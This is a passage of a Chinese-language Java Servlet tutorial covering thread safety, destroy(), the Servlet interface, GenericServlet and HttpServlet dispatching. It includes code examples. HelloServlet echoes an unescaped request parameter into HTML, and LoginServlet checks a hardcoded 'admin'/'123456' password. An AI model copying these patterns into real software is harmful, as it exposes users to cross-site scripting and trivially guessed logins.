<li><code>protected void doPost(HttpServletRequest request, HttpServletResponse response)</code><ul>
<li>处理 HTTP POST 请求。POST 请求通常用于向服务器提交数据，例如提交一个表单。</li>
</ul>
</li>
</ul>
<hr>
<h4 id="2-3-4-线程安全问题"><a href="#2-3-4-线程安全问题" class="headerlink" title="2.3.4 线程安全问题"></a>2.3.4 线程安全问题</h4><p>这是 Servlet 中一个非常重要且容易出错的概念。</p>
<ul>
<li><strong>原因：</strong> Servlet 容器对每个 Servlet 类只创建一个实例。当多个请求同时到达时，容器会启动多个线程，这些线程<strong>共享这唯一的 Servlet 实例</strong>。</li>
<li><strong>风险：</strong> 如果你在 Servlet 中定义了<strong>成员变量 (Instance Variables)</strong>，并且在 <code>doGet()</code> 或 <code>doPost()</code> 方法中对它进行了修改操作（写操作），那么就会发生线程安全问题。多个线程可能会同时读写这个共享变量，导致数据错乱。</li>
</ul>
<p><strong>最佳实践：</strong></p>
<ol>
<li><strong>避免使用成员变量来存储请求相关的状态。</strong></li>
<li><strong>优先使用局部变量 (Local Variables)。</strong> 在 <code>doGet()</code> 或 <code>doPost()</code> 方法内部定义的变量是局部变量，它们存储在每个线程独有的栈空间中，因此是线程安全的。</li>
<li>如果确实需要使用成员变量来共享数据（例如，一个访问计数器），必须使用同步机制（如 <code>synchronized</code> 关键字或 <code>java.util.concurrent</code> 包中的锁）来保证线程安全。</li>
</ol>
<p><strong>代码示例：</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 这是一个成员变量，如果对其进行写操作，需要考虑线程安全</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">AtomicInteger</span> <span class="variable">accessCounter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AtomicInteger</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span></span><br><span class="line">            <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// --- 业务逻辑开始 ---</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1. 获取请求参数 (name 是局部变量，线程安全)</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (name == <span class="literal">null</span>) &#123;</span><br><span class="line">            name = <span class="string">&quot;World&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. 处理业务 (更新共享的计数器，使用原子类保证线程安全)</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">currentCount</span> <span class="operator">=</span> accessCounter.incrementAndGet();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. 设置响应内容</span></span><br><span class="line">        response.setContentType(<span class="string">&quot;text/html;charset=UTF-8&quot;</span>);</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line"></span><br><span class="line">        out.println(<span class="string">&quot;&lt;html&gt;&lt;body&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;h1&gt;Hello, &quot;</span> + name + <span class="string">&quot;!&lt;/h1&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;p&gt;You are the &quot;</span> + currentCount + <span class="string">&quot; visitor.&lt;/p&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;/body&gt;&lt;/html&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// --- 业务逻辑结束 ---</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="2-4-销毁"><a href="#2-4-销毁" class="headerlink" title="2.4 销毁"></a>2.4 销毁</h3><p>这是 Servlet 生命周期的<strong>最后一个阶段</strong>。当 Servlet 容器决定不再需要该 Servlet 实例时（例如，服务器关闭或 Web 应用被移除），它会调用 Servlet 的 <code>destroy()</code> 方法，为实例的“死亡”做最后的清理工作。</p>
<p><strong>核心要点：</strong></p>
<ul>
<li><strong>执行时机：</strong> 在 Servlet 实例从服务中被移除之前执行。</li>
<li><strong>执行次数：</strong> 与 <code>init()</code> 方法一样，<code>destroy()</code> 方法在 Servlet 的整个生命周期中也<strong>只会被执行一次</strong>。</li>
<li><strong>主要目的：</strong> 释放 Servlet 在 <code>init()</code> 方法中创建的资源，或者在处理请求过程中持有的持久化资源。</li>
</ul>
<h4 id="2-4-1-destroy-方法的作用"><a href="#2-4-1-destroy-方法的作用" class="headerlink" title="2.4.1 destroy() 方法的作用"></a>2.4.1 <code>destroy()</code> 方法的作用</h4><p><code>destroy()</code> 方法是 <code>init()</code> 方法的对应操作。如果在 <code>init()</code> 中分配了资源，那么 <code>destroy()</code> 就是释放这些资源的最佳地点。</p>
<p>典型的清理任务包括：</p>
<ol>
<li><strong>关闭数据库连接：</strong> 关闭在 <code>init()</code> 中创建的数据库连接或销毁连接池。</li>
<li><strong>关闭文件流：</strong> 关闭打开的文件句柄或 I&#x2F;O 流。</li>
<li><strong>中断后台线程：</strong> 如果 Servlet 启动了一些后台任务线程，需要在这里优雅地停止它们。</li>
<li><strong>保存状态：</strong> 在应用关闭前，将一些内存中的状态数据（如访问计数器）持久化到文件或数据库中。</li>
</ol>
<hr>
<h4 id="2-4-2-destroy-方法签名"><a href="#2-4-2-destroy-方法签名" class="headerlink" title="2.4.2 destroy() 方法签名"></a>2.4.2 <code>destroy()</code> 方法签名</h4><p><code>destroy()</code> 方法在 <code>javax.servlet.Servlet</code> 接口中定义，其签名非常简单，没有任何参数：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span>;</span><br></pre></td></tr></table></figure>

<hr>
<h4 id="2-4-3-销毁方法的调用时机"><a href="#2-4-3-销毁方法的调用时机" class="headerlink" title="2.4.3 销毁方法的调用时机"></a>2.4.3 销毁方法的调用时机</h4><p>Servlet 容器会在以下几种情况下调用 <code>destroy()</code> 方法：</p>
<ol>
<li><strong>Web 应用被卸载（Undeployed）：</strong> 当你从容器中移除一个 Web 应用时，容器会销毁该应用中所有的 Servlet 实例。</li>
<li><strong>Servlet 容器正常关闭或停止：</strong> 当你正常关闭 Tomcat 等服务器时，容器会优雅地销毁它管理的所有 Servlet。</li>
<li><strong>重新部署（Redeploy）应用时：</strong> 在不停止服务器的情况下重新部署应用，容器会先销毁旧应用的 Servlet 实例，然后再创建新应用的实例。</li>
</ol>
<hr>
<h4 id="2-4-4-代码示例"><a href="#2-4-4-代码示例" class="headerlink" title="2.4.4 代码示例"></a>2.4.4 代码示例</h4><p>假设一个 Servlet 在初始化时打开了一个日志文件写入器，那么它必须在销毁时关闭这个写入器，以防止资源泄漏。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ResourceServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> PrintWriter logWriter;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">()</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 获取文件真实路径</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">logFilePath</span> <span class="operator">=</span> getServletContext().getRealPath(<span class="string">&quot;/WEB-INF/logs/servlet.log&quot;</span>);</span><br><span class="line">            <span class="comment">// 在初始化时，打开一个文件写入器作为资源</span></span><br><span class="line">            <span class="comment">// true 表示追加模式</span></span><br><span class="line">            <span class="built_in">this</span>.logWriter = <span class="keyword">new</span> <span class="title class_">PrintWriter</span>(<span class="keyword">new</span> <span class="title class_">FileWriter</span>(logFilePath, <span class="literal">true</span>));</span><br><span class="line">            logWriter.println(<span class="string">&quot;=====================&quot;</span>);</span><br><span class="line">            logWriter.println(<span class="string">&quot;ResourceServlet initialized.&quot;</span>);</span><br><span class="line">            logWriter.flush();</span><br><span class="line">            System.out.println(<span class="string">&quot;Log file writer initialized.&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ServletException</span>(<span class="string">&quot;Failed to initialize log writer&quot;</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="comment">// 每次请求都记录一条日志</span></span><br><span class="line">        <span class="keyword">if</span> (logWriter != <span class="literal">null</span>) &#123;</span><br><span class="line">            logWriter.println(<span class="string">&quot;Processing a GET request at &quot;</span> + <span class="keyword">new</span> <span class="title class_">java</span>.util.Date());</span><br><span class="line">            logWriter.flush();</span><br><span class="line">        &#125;</span><br><span class="line">        resp.getWriter().write(<span class="string">&quot;Request logged.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 在销毁时，关闭并释放资源</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.logWriter != <span class="literal">null</span>) &#123;</span><br><span class="line">            logWriter.println(<span class="string">&quot;ResourceServlet is being destroyed.&quot;</span>);</span><br><span class="line">            logWriter.println(<span class="string">&quot;=====================&quot;</span>);</span><br><span class="line">            logWriter.flush();</span><br><span class="line">            logWriter.close(); <span class="comment">// 关键步骤：关闭流</span></span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;Log file writer closed.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="重要说明"><a href="#重要说明" class="headerlink" title="重要说明"></a>重要说明</h4><ul>
<li><code>destroy()</code> 方法的执行是<strong>不能保证</strong>的。如果 Servlet 容器异常崩溃（例如，JVM 崩溃或服务器被强制 <code>kill -9</code> 终止），<code>destroy()</code> 方法可能根本没有机会被调用。因此，它只适用于<strong>优雅关闭 (graceful shutdown)</strong> 的场景。</li>
<li>一旦 <code>destroy()</code> 方法被调用，容器就会释放对该 Servlet 实例的引用，之后它会被 Java 的垃圾回收器 (Garbage Collector) 回收。如果后续还有对该 Servlet 的请求，容器会<strong>重新创建一个新的实例</strong>，并再次执行 <code>init()</code> 方法，开始一个新的生命周期。</li>
</ul>
<hr>
<h2 id="3-Servlet-继承体系"><a href="#3-Servlet-继承体系" class="headerlink" title="3. Servlet 继承体系"></a>3. Servlet 继承体系</h2><h3 id="3-1-Servlet-接口-javax-servlet-Servlet"><a href="#3-1-Servlet-接口-javax-servlet-Servlet" class="headerlink" title="3.1 Servlet 接口 (javax.servlet.Servlet)"></a>3.1 <code>Servlet</code> 接口 (javax.servlet.Servlet)</h3><p><code>Servlet</code> 接口是整个 Servlet API 的<strong>基石和核心</strong>。它位于 <code>javax.servlet</code> (或 Jakarta EE 9+ 中的 <code>jakarta.servlet</code>) 包中，定义了一个<strong>契约 (Contract)</strong>，任何想要成为 Servlet 的 Java 类都必须直接或间接地实现这个接口。</p>
<p>这个接口是<strong>协议无关 (Protocol-Independent)</strong> 的，意味着它不局限于 HTTP 协议。理论上，它可以被用来处理任何类型的客户端&#x2F;服务器协议。</p>
<h4 id="3-1-1-核心职责"><a href="#3-1-1-核心职责" class="headerlink" title="3.1.1 核心职责"></a>3.1.1 核心职责</h4><p><code>Servlet</code> 接口的核心职责是<strong>定义 Servlet 的生命周期方法</strong>。它规定了 Servlet 容器与 Servlet 实例之间交互的标准方式。</p>
<hr>
<h4 id="3-1-2-核心方法-The-Five-Methods"><a href="#3-1-2-核心方法-The-Five-Methods" class="headerlink" title="3.1.2 核心方法 (The Five Methods)"></a>3.1.2 核心方法 (The Five Methods)</h4><p><code>Servlet</code> 接口中定义了五个方法，它们构成了 Servlet 的基本框架：</p>
<ol>
<li><code>void init(ServletConfig config) throws ServletException;</code><ul>
<li><strong>生命周期方法。</strong></li>
<li>当 Servlet 实例被创建后，容器会调用此方法进行初始化。</li>
<li>它在 Servlet 的整个生命周期中只会被调用一次。</li>
<li>参数 <code>ServletConfig</code> 包含了 Servlet 的配置信息。</li>
</ul>
</li>
<li><code>void service(ServletRequest req, ServletResponse res) throws ServletException, IOException;</code><ul>
<li><strong>生命周期方法，也是最核心的方法。</strong></li>
<li>每当有请求到达时，容器就会调用此方法来处理请求。</li>
<li>参数 <code>ServletRequest</code> 和 <code>ServletResponse</code> 封装了请求和响应信息，但它们是通用的，不包含任何特定于 HTTP 的功能。</li>
</ul>
</li>
<li><code>void destroy();</code><ul>
<li><strong>生命周期方法。</strong></li>
<li>当 Servlet 实例即将被销毁时，容器会调用此方法，用于释放资源。</li>
<li>它在 Servlet 的整个生命周期中也只会被调用一次。</li>
</ul>
</li>
<li><code>ServletConfig getServletConfig();</code><ul>
<li><strong>辅助方法。</strong></li>
<li>返回一个 <code>ServletConfig</code> 对象，该对象是容器在调用 <code>init</code> 方法时传入的。</li>
<li>通过这个方法，Servlet 可以在生命周期的任何时刻获取自己的配置信息。</li>
</ul>
</li>
<li><code>String getServletInfo();</code><ul>
<li><strong>辅助方法。</strong></li>
<li>返回一个描述 Servlet 的字符串，例如作者、版本、版权信息等。</li>
<li>这个方法主要用于管理工具，实际开发中很少使用。</li>
</ul>
</li>
</ol>
<hr>
<h4 id="3-1-3-为什么我们很少直接实现此接口？"><a href="#3-1-3-为什么我们很少直接实现此接口？" class="headerlink" title="3.1.3 为什么我们很少直接实现此接口？"></a>3.1.3 为什么我们很少直接实现此接口？</h4><p>在实际的 Web 开发中，我们几乎从不直接实现 <code>Servlet</code> 接口，原因如下：</p>
<ul>
<li><strong>过于通用和底层：</strong> <code>Servlet</code> 接口是协议无关的。它的 <code>ServletRequest</code> 和 <code>ServletResponse</code> 对象没有提供处理 HTTP 特有信息（如请求方法 GET&#x2F;POST、请求头、Cookie、Session 等）的便捷方法。如果直接实现它，你需要自己去解析原始的请求数据流，这非常繁琐且容易出错。</li>
<li><strong>需要实现所有方法：</strong> 作为一个接口，你必须为它的所有五个方法都提供实现，即使你只需要用到 <code>service</code> 方法，其他方法也需要写一个空实现，这增加了样板代码。</li>
</ul>
<p>为了解决这些问题，Servlet API 提供了两个方便的实现类：<code>GenericServlet</code> 和 <code>HttpServlet</code>，它们为我们处理了大量底层工作。</p>
<hr>
<h3 id="3-2-GenericServlet-抽象类"><a href="#3-2-GenericServlet-抽象类" class="headerlink" title="3.2 GenericServlet 抽象类"></a>3.2 <code>GenericServlet</code> 抽象类</h3><p><code>GenericServlet</code> 是一个抽象类，它实现了 <code>Servlet</code> 接口和 <code>ServletConfig</code> 接口，提供了一个通用的、<strong>协议无关</strong>的 Servlet 骨架。</p>
<p>它的主要目的是<strong>简化 Servlet 的编写</strong>，让我们不必从零开始实现 <code>Servlet</code> 接口中的所有方法，从而可以更专注于业务逻辑。</p>
<h4 id="3-2-1-主要贡献与特点"><a href="#3-2-1-主要贡献与特点" class="headerlink" title="3.2.1 主要贡献与特点"></a>3.2.1 主要贡献与特点</h4><ol>
<li><strong>实现了 <code>Servlet</code> 接口：</strong><ul>
<li>它为 <code>Servlet</code> 接口中的大多数方法提供了默认的、有意义的实现。例如，<code>destroy()</code> 和 <code>getServletInfo()</code> 方法都有了默认的空实现，子类只有在需要时才需要重写它们。</li>
</ul>
</li>
<li><strong>简化了 <code>init()</code> 方法：</strong><ul>
<li><code>GenericServlet</code> 已经为我们实现了 <code>init(ServletConfig config)</code> 方法。它的主要工作就是将容器传入的 <code>ServletConfig</code> 对象保存起来，以便后续通过 <code>getServletConfig()</code> 等方法调用。</li>
<li>它还提供了一个更方便的、<strong>无参数的 <code>init()</code> 方法</strong>供子类重写。这样，我们在进行自己的初始化工作时，就无需再手动调用 <code>super.init(config)</code> 了。</li>
</ul>
</li>
<li><strong>唯一的抽象方法 <code>service()</code>：</strong><ul>
<li><code>GenericServlet</code> 将 <code>service(ServletRequest req, ServletResponse res)</code> 方法声明为 <code>abstract</code>。</li>
<li>这意味着任何继承 <code>GenericServlet</code> 的子类都<strong>必须</strong>实现这个方法，因为这正是处理请求的核心逻辑所在。</li>
</ul>
</li>
<li><strong>提供了便捷的辅助方法：</strong><ul>
<li>它实现了 <code>ServletConfig</code> 接口的所有方法，如 <code>getServletContext()</code>、<code>getInitParameter(String name)</code>、<code>getServletName()</code> 等。</li>
<li>这使得我们在 Servlet 内部可以直接调用 <code>getServletContext()</code> 来获取应用上下文，而不需要先 <code>getServletConfig().getServletContext()</code>，大大简化了代码。</li>
</ul>
</li>
</ol>
<hr>
<h4 id="3-2-2-为什么在-Web-开发中仍然很少直接使用它？"><a href="#3-2-2-为什么在-Web-开发中仍然很少直接使用它？" class="headerlink" title="3.2.2 为什么在 Web 开发中仍然很少直接使用它？"></a>3.2.2 为什么在 Web 开发中仍然很少直接使用它？</h4><p>尽管 <code>GenericServlet</code> 提供了很多便利，但在基于 HTTP 协议的 Web 开发中，我们仍然很少直接继承它。主要原因是：</p>
<ul>
<li><strong>协议无关性：</strong> 它的设计目标是通用的，不依赖于任何特定协议。因此，它的核心 <code>service</code> 方法的参数是通用的 <code>ServletRequest</code> 和 <code>ServletResponse</code>。</li>
<li><strong>功能局限：</strong> 这两个通用接口<strong>没有提供处理 HTTP 协议特有信息的方法</strong>。例如，你无法直接从 <code>ServletRequest</code> 中获取请求是 GET 还是 POST，也无法从 <code>ServletResponse</code> 中设置 Cookie 或进行重定向。如果想使用这些功能，你必须先将参数强制类型转换为 <code>HttpServletRequest</code> 和 <code>HttpServletResponse</code>，这既不方便也不优雅。</li>
</ul>
<p><strong>示例代码 (不推荐用于 Web 开发):</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 这是一个继承 GenericServlet 的例子，仅作演示</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyGenericServlet</span> <span class="keyword">extends</span> <span class="title class_">GenericServlet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(ServletRequest request, ServletResponse response)</span></span><br><span class="line">            <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 必须进行强制类型转换才能使用 HTTP 特有的功能</span></span><br><span class="line">        <span class="comment">// HttpServletRequest httpRequest = (HttpServletRequest) request;</span></span><br><span class="line">        <span class="comment">// String method = httpRequest.getMethod();</span></span><br><span class="line"></span><br><span class="line">        response.setContentType(<span class="string">&quot;text/plain&quot;</span>);</span><br><span class="line">        response.getWriter().write(<span class="string">&quot;This is a response from GenericServlet.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>结论：</strong><code>GenericServlet</code> 是一个重要的中间层，它为实现 <code>Servlet</code> 接口提供了极大的便利。但由于其协议无关的特性，它并不直接适用于处理 HTTP 请求。为了解决这个问题，Servlet API 在 <code>GenericServlet</code> 的基础上，提供了一个专门用于 HTTP 协议的子类——<code>HttpServlet</code>。</p>
<hr>
<h3 id="3-3-HttpServlet-抽象类"><a href="#3-3-HttpServlet-抽象类" class="headerlink" title="3.3 HttpServlet 抽象类"></a>3.3 <code>HttpServlet</code> 抽象类</h3><p><code>HttpServlet</code> 是一个专门为处理 <strong>HTTP 协议</strong> 而设计的抽象类，它继承自 <code>GenericServlet</code>。在实际的 Java Web 开发中，我们编写的 Servlet <strong>几乎总是</strong>直接或间接地继承自 <code>HttpServlet</code>。</p>
<p>它封装了处理 HTTP 请求的复杂性，为开发者提供了一个清晰、强大且易于使用的编程模型。</p>
<h4 id="3-3-1-核心优势：请求分发器"><a href="#3-3-1-核心优势：请求分发器" class="headerlink" title="3.3.1 核心优势：请求分发器"></a>3.3.1 核心优势：请求分发器</h4><p><code>HttpServlet</code> 最核心、最巧妙的设计在于它对 <code>service()</code> 方法的重写。它并没有将 <code>service()</code> 方法声明为抽象的，而是提供了一个具体的实现。这个 <code>service()</code> 方法不包含任何业务逻辑，而是扮演一个<strong>请求分发器 (Dispatcher)</strong> 的角色。</p>
<p>其工作流程如下：</p>
<ol>
<li><strong>接收请求：</strong> 容器调用 <code>HttpServlet</code> 的 <code>service()</code> 方法，传入 <code>ServletRequest</code> 和 <code>ServletResponse</code> 对象。</li>
<li><strong>类型转换：</strong> <code>service()</code> 方法内部首先将这两个通用的对象向下转型（cast）为 HTTP 专用的 <code>HttpServletRequest</code> 和 <code>HttpServletResponse</code> 对象。如果转换失败，会抛出 <code>ServletException</code>。</li>
<li><strong>获取请求方法：</strong> 它调用 <code>httpServletRequest.getMethod()</code> 来获取客户端请求的 HTTP 方法（例如 “GET”, “POST”, “PUT”, “DELETE” 等）。</li>
<li><strong>调用 <code>doXXX()</code> 方法：</strong> 根据获取到的请求方法字符串，<code>service()</code> 方法会调用与之对应的 <code>doXXX()</code> 方法。<ul>
<li>如果请求是 <strong>GET</strong>，则调用 <code>doGet(HttpServletRequest, HttpServletResponse)</code>。</li>
<li>如果请求是 <strong>POST</strong>，则调用 <code>doPost(HttpServletRequest, HttpServletResponse)</code>。</li>
<li>…以此类推。</li>
</ul>
</li>
</ol>
<p>我们作为开发者<strong>不再需要重写 <code>service()</code> 方法</strong>，只需要：</p>
<ul>
<li><strong>继承 <code>HttpServlet</code> 类。</strong></li>
<li><strong>根据需要处理的请求类型，重写相应的 <code>doXXX()</code> 方法</strong>（最常见的是 <code>doGet()</code> 和 <code>doPost()</code>）。</li>
<li>在重写的 <code>doXXX()</code> 方法中，实现具体的业务逻辑。</li>
</ul>
<p><strong>重要提示：</strong> <code>HttpServlet</code> 中这些 <code>doXXX()</code> 方法的<strong>默认实现</strong>通常是向客户端返回一个 <strong>HTTP 405 “Method Not Allowed”</strong> 的错误。这意味着，如果你想让你的 Servlet 处理 POST 请求，你就必须重写 <code>doPost()</code> 方法，否则客户端会收到一个 405 错误。</p>
<hr>
<h4 id="3-3-2-代码示例"><a href="#3-3-2-代码示例" class="headerlink" title="3.3.2 代码示例"></a>3.3.2 代码示例</h4><p>一个典型的 <code>HttpServlet</code> 子类如下所示：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LoginServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 处理 GET 请求，通常用于显示登录页面</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span></span><br><span class="line">            <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        response.setContentType(<span class="string">&quot;text/html;charset=UTF-8&quot;</span>);</span><br><span class="line">        response.getWriter().write(<span class="string">&quot;&lt;h1&gt;Please Login&lt;/h1&gt;&quot;</span>);</span><br><span class="line">        response.getWriter().write(<span class="string">&quot;&lt;form action=&#x27;/login&#x27; method=&#x27;post&#x27;&gt;&quot;</span>);</span><br><span class="line">        response.getWriter().write(<span class="string">&quot;Username: &lt;input type=&#x27;text&#x27; name=&#x27;username&#x27;&gt;&lt;br&gt;&quot;</span>);</span><br><span class="line">        response.getWriter().write(<span class="string">&quot;Password: &lt;input type=&#x27;password&#x27; name=&#x27;password&#x27;&gt;&lt;br&gt;&quot;</span>);</span><br><span class="line">        response.getWriter().write(<span class="string">&quot;&lt;input type=&#x27;submit&#x27; value=&#x27;Login&#x27;&gt;&quot;</span>);</span><br><span class="line">        response.getWriter().write(<span class="string">&quot;&lt;/form&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 处理 POST 请求，通常用于处理表单提交</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span></span><br><span class="line">            <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;password&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 在这里实现用户名和密码的验证逻辑...</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;admin&quot;</span>.equals(username) &amp;&amp; <span class="string">&quot;123456&quot;</span>.equals(password)) &#123;</span><br><span class="line">            response.getWriter().write(<span class="string">&quot;Login successful! Welcome, &quot;</span> + username);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            response.getWriter().write(<span class="string">&quot;Login failed! Invalid username or password.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="二、Servlet-核心-API"><a href="#二、Servlet-核心-API" class="headerlink" title="二、Servlet 核心 API"></a>二、Servlet 核心 API</h1><h2 id="1-HttpServletRequest-请求对象"><a href="#1-HttpServletRequest-请求对象" class="headerlink" title="1. HttpServletRequest (请求对象)"></a>1. HttpServletRequest (请求对象)</h2><h3 id="1-1-作用"><a href="#1-1-作用" class="headerlink" title="1.1 作用"></a>1.1 作用</h3><p><code>HttpServletRequest</code> 对象由 Servlet 容器创建，并作为参数传递给 Servlet 的 <code>service()</code>、<code>doGet()</code> 或 <code>doPost()</code> 等方法。它的核心作用是<strong>客户端发送HTTP请求的完整表示</strong>。</p>
<p>它封装了 HTTP 请求的三个主要部分：</p>
<ol>
<li><strong>请求行 (Request Line):</strong> 包括请求方法（GET, POST 等）、请求的资源路径 (URI) 和 HTTP 协议版本。</li>
